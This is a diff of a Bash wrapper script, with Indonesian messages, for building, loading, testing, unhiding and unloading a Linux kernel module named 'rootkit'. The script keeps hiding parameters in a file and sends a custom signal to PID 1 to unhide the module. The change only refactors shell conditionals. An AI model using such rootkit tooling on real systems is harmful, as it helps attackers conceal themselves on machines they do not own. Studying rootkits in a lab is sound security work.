@@ -66,8 +66,12 @@ do_load() {
 }
 
 saved_param() { # $1 = nomor baris 1..4
-  [ -f .rk_params ] && sed -n "${1}p" .rk_params || case "$1" in
-    1) echo "$DEF_PREFIX";; 2) echo "$DEF_MAGIC";; 3) echo "$DEF_UNHIDE";; *) echo "$DEF_HIDEMOD";; esac
+  if [ -f .rk_params ]; then
+    sed -n "${1}p" .rk_params
+  else
+    case "$1" in
+      1) echo "$DEF_PREFIX";; 2) echo "$DEF_MAGIC";; 3) echo "$DEF_UNHIDE";; *) echo "$DEF_HIDEMOD";; esac
+  fi
 }
 
 do_status() {
@@ -122,7 +126,11 @@ do_unhide() {
   need_root unhide || return 1
   local unhide; unhide="$(saved_param 3)"
   if ! loaded; then echo "[rk] modul tidak loaded"; return 1; fi
-  kill "-$unhide" 1 2>/dev/null && echo "[rk] sinyal unhide ($unhide) terkirim" || { echo "[rk] sinyal gagal"; return 1; }
+  if kill "-$unhide" 1 2>/dev/null; then
+    echo "[rk] sinyal unhide ($unhide) terkirim"
+  else
+    echo "[rk] sinyal gagal"; return 1
+  fi
   sleep 1
 }
 
@@ -132,7 +140,7 @@ do_unload() {
     echo "[rk] modul tidak loaded — tidak ada yang di-unload"
     return 0
   fi
-  loaded && do_unhide || true
+  if loaded; then do_unhide || true; fi
   if $SUDO rmmod rootkit; then
     echo "[rk] unloaded OK"
     rm -f .rk_params
@@ -155,7 +163,7 @@ menu() {
 }
 
 case "${1:-}" in
-  "") [ -t 0 ] && menu || { echo "stdin bukan TTY — pakai: $0 {build|load|status|test|unhide|unload}"; exit 1; };;
+  "") if [ -t 0 ]; then menu; else echo "stdin bukan TTY — pakai: $0 {build|load|status|test|unhide|unload}"; exit 1; fi;;
   --menu) menu;;
   build) do_build;; load) do_load;; status) do_status;;
   test) do_test;; unhide) do_unhide;; unload) do_unload;;
